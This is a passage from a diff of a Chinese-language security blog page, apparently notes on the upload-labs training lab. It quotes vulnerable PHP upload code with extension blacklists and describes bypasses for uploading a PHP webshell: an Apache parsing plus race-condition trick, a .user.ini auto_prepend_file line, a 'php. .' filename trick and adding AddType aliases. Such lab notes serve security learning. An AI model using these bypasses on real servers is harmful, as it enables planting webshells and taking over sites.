class="string">&quot;.tiff&quot;</span>, <span class="string">&quot;.jpeg&quot;</span>, <span class="string">&quot;.png&quot;</span> );</span><br><span class="line"></span><br><span class="line">......</span><br><span class="line">......</span><br><span class="line">......  </span><br><span class="line">  <span class="comment">/** upload()</span></span><br><span class="line"><span class="comment">   **</span></span><br><span class="line"><span class="comment">   ** Method to upload the file.</span></span><br><span class="line"><span class="comment">   ** This is the only method to call outside the class.</span></span><br><span class="line"><span class="comment">   ** <span class="doctag">@para</span> String name of directory we upload to</span></span><br><span class="line"><span class="comment">   ** <span class="doctag">@returns</span> void</span></span><br><span class="line"><span class="comment">  **/</span></span><br><span class="line">  <span class="function"><span class="keyword">function</span> <span class="title">upload</span>(<span class="params"> <span class="variable">$dir</span> </span>)</span>&#123;</span><br><span class="line">  </span><br><span class="line">    <span class="variable">$ret</span> = <span class="variable language_">$this</span>-&gt;<span class="title function_ invoke__">isUploadedFile</span>();</span><br><span class="line">  </span><br><span class="line">    <span class="keyword">if</span>( <span class="variable">$ret</span> != <span class="number">1</span> )&#123;</span><br><span class="line">      <span class="keyword">return</span> <span class="variable language_">$this</span>-&gt;<span class="title function_ invoke__">resultUpload</span>( <span class="variable">$ret</span> );</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="variable">$ret</span> = <span class="variable language_">$this</span>-&gt;<span class="title function_ invoke__">setDir</span>( <span class="variable">$dir</span> );</span><br><span class="line">    <span class="keyword">if</span>( <span class="variable">$ret</span> != <span class="number">1</span> )&#123;</span><br><span class="line">      <span class="keyword">return</span> <span class="variable language_">$this</span>-&gt;<span class="title function_ invoke__">resultUpload</span>( <span class="variable">$ret</span> );</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="variable">$ret</span> = <span class="variable language_">$this</span>-&gt;<span class="title function_ invoke__">checkExtension</span>();</span><br><span class="line">    <span class="keyword">if</span>( <span class="variable">$ret</span> != <span class="number">1</span> )&#123;</span><br><span class="line">      <span class="keyword">return</span> <span class="variable language_">$this</span>-&gt;<span class="title function_ invoke__">resultUpload</span>( <span class="variable">$ret</span> );</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="variable">$ret</span> = <span class="variable language_">$this</span>-&gt;<span class="title function_ invoke__">checkSize</span>();</span><br><span class="line">    <span class="keyword">if</span>( <span class="variable">$ret</span> != <span class="number">1</span> )&#123;</span><br><span class="line">      <span class="keyword">return</span> <span class="variable language_">$this</span>-&gt;<span class="title function_ invoke__">resultUpload</span>( <span class="variable">$ret</span> );  </span><br><span class="line">    &#125;</span><br><span class="line">  </span><br><span class="line">    <span class="comment">// if flag to check if the file exists is set to 1</span></span><br><span class="line">  </span><br><span class="line">    <span class="keyword">if</span>( <span class="variable language_">$this</span>-&gt;cls_file_exists == <span class="number">1</span> )&#123;</span><br><span class="line">  </span><br><span class="line">      <span class="variable">$ret</span> = <span class="variable language_">$this</span>-&gt;<span class="title function_ invoke__">checkFileExists</span>();</span><br><span class="line">      <span class="keyword">if</span>( <span class="variable">$ret</span> != <span class="number">1</span> )&#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="variable language_">$this</span>-&gt;<span class="title function_ invoke__">resultUpload</span>( <span class="variable">$ret</span> );  </span><br><span class="line">      &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// if we are here, we are ready to move the file to destination</span></span><br><span class="line"></span><br><span class="line">    <span class="variable">$ret</span> = <span class="variable language_">$this</span>-&gt;<span class="title function_ invoke__">move</span>();</span><br><span class="line">    <span class="keyword">if</span>( <span class="variable">$ret</span> != <span class="number">1</span> )&#123;</span><br><span class="line">      <span class="keyword">return</span> <span class="variable language_">$this</span>-&gt;<span class="title function_ invoke__">resultUpload</span>( <span class="variable">$ret</span> );  </span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// check if we need to rename the file</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span>( <span class="variable language_">$this</span>-&gt;cls_rename_file == <span class="number">1</span> )&#123;</span><br><span class="line">      <span class="variable">$ret</span> = <span class="variable language_">$this</span>-&gt;<span class="title function_ invoke__">renameFile</span>();</span><br><span class="line">      <span class="keyword">if</span>( <span class="variable">$ret</span> != <span class="number">1</span> )&#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="variable language_">$this</span>-&gt;<span class="title function_ invoke__">resultUpload</span>( <span class="variable">$ret</span> );  </span><br><span class="line">      &#125;</span><br><span class="line">    &#125;</span><br><span class="line">  </span><br><span class="line">    <span class="comment">// if we are here, everything worked as planned :)</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> <span class="variable language_">$this</span>-&gt;<span class="title function_ invoke__">resultUpload</span>( <span class="string">&quot;SUCCESS&quot;</span> );</span><br><span class="line">  </span><br><span class="line">  &#125;</span><br><span class="line">......</span><br><span class="line">......</span><br><span class="line">...... </span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure>
+
+<blockquote>
+<p>先检查后缀，再到服务器,不能直接上传php文件了，apache从后往前看，不能去解析那个.7z文件那么就会往前面解析php文件</p>
+<p>我们要在重命名之前,对那个访问小马文件进行访问，就可以留下一句话木马</p>
+<p>在上传抓包生成小马文件后，在末尾加上.7z</p>
+</blockquote>
+<p>‍</p>
+
+      
+    </div>
+    <footer class="article-footer">
+      <a data-url="http://example.com/2025/05/20/Web/%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0/upload-labs/Apache%E8%A7%A3%E6%9E%90%E6%BC%8F%E6%B4%9E+%E6%9D%A1%E4%BB%B6%E7%AB%9E%E4%BA%89/" data-id="cmaxy8gc90039kg7k0unbbjen" data-title="" class="article-share-link"><span class="fa fa-share">Share</span></a>
+      
+      
+      
+    </footer>
+  </div>
+  
+</article>
+
+
+
+  
+    <article id="post-Web/文件上传/upload-labs/user.ini" class="h-entry article article-type-post" itemprop="blogPost" itemscope itemtype="https://schema.org/BlogPosting">
+  <div class="article-meta">
+    <a href="/2025/05/20/Web/%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0/upload-labs/user.ini/" class="article-date">
+  <time class="dt-published" datetime="2025-05-20T00:55:56.000Z" itemprop="datePublished">2025-05-20</time>
+</a>
+    
+  </div>
+  <div class="article-inner">
+    
+    
+    <div class="e-content article-entry" itemprop="articleBody">
+      
+        <h1 id="user-ini"><a href="#user-ini" class="headerlink" title="user.ini"></a>user.ini</h1><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line"><span class="variable">$is_upload</span> = <span class="literal">false</span>;</span><br><span class="line"><span class="variable">$msg</span> = <span class="literal">null</span>;</span><br><span class="line"><span class="keyword">if</span> (<span class="keyword">isset</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;submit&#x27;</span>])) &#123;</span><br><span class="line">    <span class="keyword">if</span> (<span class="title function_ invoke__">file_exists</span>(UPLOAD_PATH)) &#123;</span><br><span class="line">        <span class="variable">$deny_ext</span> = <span class="keyword">array</span>(<span class="string">&quot;.php&quot;</span>,<span class="string">&quot;.php5&quot;</span>,<span class="string">&quot;.php4&quot;</span>,<span class="string">&quot;.php3&quot;</span>,<span class="string">&quot;.php2&quot;</span>,<span class="string">&quot;.html&quot;</span>,<span class="string">&quot;.htm&quot;</span>,<span class="string">&quot;.phtml&quot;</span>,<span class="string">&quot;.pht&quot;</span>,<span class="string">&quot;.pHp&quot;</span>,<span class="string">&quot;.pHp5&quot;</span>,<span class="string">&quot;.pHp4&quot;</span>,<span class="string">&quot;.pHp3&quot;</span>,<span class="string">&quot;.pHp2&quot;</span>,<span class="string">&quot;.Html&quot;</span>,<span class="string">&quot;.Htm&quot;</span>,<span class="string">&quot;.pHtml&quot;</span>,<span class="string">&quot;.jsp&quot;</span>,<span class="string">&quot;.jspa&quot;</span>,<span class="string">&quot;.jspx&quot;</span>,<span class="string">&quot;.jsw&quot;</span>,<span class="string">&quot;.jsv&quot;</span>,<span class="string">&quot;.jspf&quot;</span>,<span class="string">&quot;.jtml&quot;</span>,<span class="string">&quot;.jSp&quot;</span>,<span class="string">&quot;.jSpx&quot;</span>,<span class="string">&quot;.jSpa&quot;</span>,<span class="string">&quot;.jSw&quot;</span>,<span class="string">&quot;.jSv&quot;</span>,<span class="string">&quot;.jSpf&quot;</span>,<span class="string">&quot;.jHtml&quot;</span>,<span class="string">&quot;.asp&quot;</span>,<span class="string">&quot;.aspx&quot;</span>,<span class="string">&quot;.asa&quot;</span>,<span class="string">&quot;.asax&quot;</span>,<span class="string">&quot;.ascx&quot;</span>,<span class="string">&quot;.ashx&quot;</span>,<span class="string">&quot;.asmx&quot;</span>,<span class="string">&quot;.cer&quot;</span>,<span class="string">&quot;.aSp&quot;</span>,<span class="string">&quot;.aSpx&quot;</span>,<span class="string">&quot;.aSa&quot;</span>,<span class="string">&quot;.aSax&quot;</span>,<span class="string">&quot;.aScx&quot;</span>,<span class="string">&quot;.aShx&quot;</span>,<span class="string">&quot;.aSmx&quot;</span>,<span class="string">&quot;.cEr&quot;</span>,<span class="string">&quot;.sWf&quot;</span>,<span class="string">&quot;.swf&quot;</span>,<span class="string">&quot;.htaccess&quot;</span>);</span><br><span class="line">        <span class="variable">$file_name</span> = <span class="title function_ invoke__">trim</span>(<span class="variable">$_FILES</span>[<span class="string">&#x27;upload_file&#x27;</span>][<span class="string">&#x27;name&#x27;</span>]);</span><br><span class="line">        <span class="variable">$file_name</span> = <span class="title function_ invoke__">deldot</span>(<span class="variable">$file_name</span>);<span class="comment">//删除文件名末尾的点</span></span><br><span class="line">        <span class="variable">$file_ext</span> = <span class="title function_ invoke__">strrchr</span>(<span class="variable">$file_name</span>, <span class="string">&#x27;.&#x27;</span>);  <span class="comment">//分割文件名通过.来分割</span></span><br><span class="line">        <span class="variable">$file_ext</span> = <span class="title function_ invoke__">str_ireplace</span>(<span class="string">&#x27;::$DATA&#x27;</span>, <span class="string">&#x27;&#x27;</span>, <span class="variable">$file_ext</span>);<span class="comment">//去除字符串::$DATA</span></span><br><span class="line">        <span class="variable">$file_ext</span> = <span class="title function_ invoke__">trim</span>(<span class="variable">$file_ext</span>); <span class="comment">//首尾去空</span></span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> (!<span class="title function_ invoke__">in_array</span>(<span class="variable">$file_ext</span>, <span class="variable">$deny_ext</span>)) &#123;</span><br><span class="line">            <span class="variable">$temp_file</span> = <span class="variable">$_FILES</span>[<span class="string">&#x27;upload_file&#x27;</span>][<span class="string">&#x27;tmp_name&#x27;</span>];</span><br><span class="line">            <span class="variable">$img_path</span> = UPLOAD_PATH.<span class="string">&#x27;/&#x27;</span>.<span class="title function_ invoke__">date</span>(<span class="string">&quot;YmdHis&quot;</span>).<span class="title function_ invoke__">rand</span>(<span class="number">1000</span>,<span class="number">9999</span>).<span class="variable">$file_ext</span>;</span><br><span class="line">            <span class="keyword">if</span> (<span class="title function_ invoke__">move_uploaded_file</span>(<span class="variable">$temp_file</span>, <span class="variable">$img_path</span>)) &#123;</span><br><span class="line">                <span class="variable">$is_upload</span> = <span class="literal">true</span>;</span><br><span class="line">            &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">                <span class="variable">$msg</span> = <span class="string">&#x27;上传出错！&#x27;</span>;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            <span class="variable">$msg</span> = <span class="string">&#x27;此文件类型不允许上传！&#x27;</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        <span class="variable">$msg</span> = UPLOAD_PATH . <span class="string">&#x27;文件夹不存在,请手工创建！&#x27;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p>发现.htaccess也被加入黑名单，所以我们要想其他方法，.user.ini绕过</p>
+<h1 id="user-ini文件写法"><a href="#user-ini文件写法" class="headerlink" title=".user.ini文件写法"></a>.user.ini文件写法</h1><blockquote>
+<p>auto_prepend_file&#x3D;1.jpg   &#x2F;&#x2F;目录下面所有PHP文件都会预先加载1.jpg文件下的内容</p>
+</blockquote>
+<p>‍</p>
+<p>‍</p>
+<h1 id="方法二"><a href="#方法二" class="headerlink" title="方法二"></a>方法二</h1><h2 id="点加空格加点"><a href="#点加空格加点" class="headerlink" title="点加空格加点"></a>点加空格加点</h2><p>因为源码并未循环，只过滤了一遍，所以有漏洞可钻,  1.php. .</p>
+<blockquote>
+<p>file_name会变成1.php，然后file_ext读取的是.</p>
+</blockquote>
+<p>由于windows下后缀的.和空格都会自动被删除，所以我们通过burpsuite更改后缀</p>
+<p>很遗憾BUUCFT的源码不一样，但是我自己搭建的靶场也提交错误，所以只能使用大小写绕过，因为在系统下后缀改成大小写会被自动解析成为小写的</p>
+
+      
+    </div>
+    <footer class="article-footer">
+      <a data-url="http://example.com/2025/05/20/Web/%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0/upload-labs/user.ini/" data-id="cmaxy8gce003hkg7kgofg8b1i" data-title="" class="article-share-link"><span class="fa fa-share">Share</span></a>
+      
+      
+      
+    </footer>
+  </div>
+  
+</article>
+
+
+
+  
+    <article id="post-Web/文件上传/upload-labs/别名攻击" class="h-entry article article-type-post" itemprop="blogPost" itemscope itemtype="https://schema.org/BlogPosting">
+  <div class="article-meta">
+    <a href="/2025/05/20/Web/%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0/upload-labs/%E5%88%AB%E5%90%8D%E6%94%BB%E5%87%BB/" class="article-date">
+  <time class="dt-published" datetime="2025-05-20T00:55:56.000Z" itemprop="datePublished">2025-05-20</time>
+</a>
+    
+  </div>
+  <div class="article-inner">
+    
+    
+    <div class="e-content article-entry" itemprop="articleBody">
+      
+        <h1 id="别名攻击"><a href="#别名攻击" class="headerlink" title="别名攻击"></a>别名攻击</h1><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line"><span class="variable">$is_upload</span> = <span class="literal">false</span>;</span><br><span class="line"><span class="variable">$msg</span> = <span class="literal">null</span>;</span><br><span class="line"><span class="keyword">if</span> (<span class="keyword">isset</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;submit&#x27;</span>])) &#123;</span><br><span class="line">    <span class="keyword">if</span> (<span class="title function_ invoke__">file_exists</span>(UPLOAD_PATH)) &#123;</span><br><span class="line">        <span class="variable">$deny_ext</span> = <span class="keyword">array</span>(<span class="string">&#x27;.asp&#x27;</span>,<span class="string">&#x27;.aspx&#x27;</span>,<span class="string">&#x27;.php&#x27;</span>,<span class="string">&#x27;.jsp&#x27;</span>);</span><br><span class="line">        <span class="variable">$file_name</span> = <span class="title function_ invoke__">trim</span>(<span class="variable">$_FILES</span>[<span class="string">&#x27;upload_file&#x27;</span>][<span class="string">&#x27;name&#x27;</span>]);</span><br><span class="line">        <span class="variable">$file_name</span> = <span class="title function_ invoke__">deldot</span>(<span class="variable">$file_name</span>);<span class="comment">//删除文件名末尾的点</span></span><br><span class="line">        <span class="variable">$file_ext</span> = <span class="title function_ invoke__">strrchr</span>(<span class="variable">$file_name</span>, <span class="string">&#x27;.&#x27;</span>);</span><br><span class="line">        <span class="variable">$file_ext</span> = <span class="title function_ invoke__">strtolower</span>(<span class="variable">$file_ext</span>); <span class="comment">//转换为小写</span></span><br><span class="line">        <span class="variable">$file_ext</span> = <span class="title function_ invoke__">str_ireplace</span>(<span class="string">&#x27;::$DATA&#x27;</span>, <span class="string">&#x27;&#x27;</span>, <span class="variable">$file_ext</span>);<span class="comment">//去除字符串::$DATA</span></span><br><span class="line">        <span class="variable">$file_ext</span> = <span class="title function_ invoke__">trim</span>(<span class="variable">$file_ext</span>); <span class="comment">//收尾去空</span></span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span>(!<span class="title function_ invoke__">in_array</span>(<span class="variable">$file_ext</span>, <span class="variable">$deny_ext</span>)) &#123;</span><br><span class="line">            <span class="variable">$temp_file</span> = <span class="variable">$_FILES</span>[<span class="string">&#x27;upload_file&#x27;</span>][<span class="string">&#x27;tmp_name&#x27;</span>];</span><br><span class="line">            <span class="variable">$img_path</span> = UPLOAD_PATH.<span class="string">&#x27;/&#x27;</span>.<span class="title function_ invoke__">date</span>(<span class="string">&quot;YmdHis&quot;</span>).<span class="title function_ invoke__">rand</span>(<span class="number">1000</span>,<span class="number">9999</span>).<span class="variable">$file_ext</span>;        </span><br><span class="line">            <span class="keyword">if</span> (<span class="title function_ invoke__">move_uploaded_file</span>(<span class="variable">$temp_file</span>,<span class="variable">$img_path</span>)) &#123;</span><br><span class="line">                 <span class="variable">$is_upload</span> = <span class="literal">true</span>;</span><br><span class="line">            &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">                <span class="variable">$msg</span> = <span class="string">&#x27;上传出错！&#x27;</span>;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            <span class="variable">$msg</span> = <span class="string">&#x27;不允许上传.asp,.aspx,.php,.jsp后缀文件！&#x27;</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        <span class="variable">$msg</span> = UPLOAD_PATH . <span class="string">&#x27;文件夹不存在,请手工创建！&#x27;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<blockquote>
+<p>只提出了黑名单，可以使用别名攻击</p>
+<p>但是改成php3测试连接返回未空，而且会提示你下载一些东西，说明服务器并没将php3当作php来解析</p>
+<p>所以我没要找到服务器Apache的配置文件httpd.conf然后找到AddType,找到<kbd>#AddType application/x-httpd-php  .php</kbd>​这一句，意思是以什么结尾的服务器会以php认可</p>
+</blockquote>
+<p><img src="/.com//image-20250119180334-7khsgt2.png" alt="image"></p>
+<blockquote>
+<p>添加多一些后缀，也就可以实现别名攻击,还有可能和php版本有问题</p>
+</blockquote>
+<p>‍</p>
+
+      
+    </div>
+    <footer class="article-footer">
+      <a data-url="http://example.com/2025/05/20/Web/%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0/upload-labs/%E5%88%AB%E5%90%8D%E6%94%BB%E5%87%BB/" data-id="cmaxy8gcf003ikg7k21q56zop" data-title="" class="article-share-link"><span class="fa fa-share">Share</span></a>
       
       
       
@@ -908,19 +1046,19 @@ sqlmap -g &quot;inurl:.php?id=&quot;
           </li>
         
           <li>
-            <a href="/2025/05/20/Web/%E5%B7%A5%E5%85%B7%E4%BD%BF%E7%94%A8/sqlmap/">(no title)</a>
-          </li>
-        
-          <li>
             <a href="/2025/05/20/Web/%E7%BB%95%E8%BF%87/%E7%BB%95%E8%BF%87/">(no title)</a>
           </li>
         
           <li>
-            <a href="/2025/05/20/Web/%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0/upload-labs/Apache%E8%A7%A3%E6%9E%90%E6%BC%8F%E6%B4%9E+%E6%9D%A1%E4%BB%B6%E7%AB%9E%E4%BA%89/">(no title)</a>
+            <a href="/2025/05/20/Web/%E5%B7%A5%E5%85%B7%E4%BD%BF%E7%94%A8/sqlmap/">(no title)</a>
           </li>
         
           <li>
-            <a href="/2025/05/20/Web/%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0/upload-labs/user.ini/">(no title)</a>
+            <a href="/2025/05/20/Web/%E6%B3%A8%E5%85%A5%E6%BC%8F%E6%B4%9E/SQL%E6%B3%A8%E5%85%A5/%E5%9F%BA%E7%A1%80%E6%B3%A8%E5%85%A5%E6%B5%81%E7%A8%8B/">(no title)</a>
+          </li>
+        
+          <li>
+            <a href="/2025/05/20/Web/%E6%B3%A8%E5%85%A5%E6%BC%8F%E6%B4%9E/SQL%E6%B3%A8%E5%85%A5/%E5%A0%86%E5%8F%A0%E6%B3%A8%E5%85%A5%20stacked%20%20injection/">(no title)</a>
           </li>
         
       </ul>
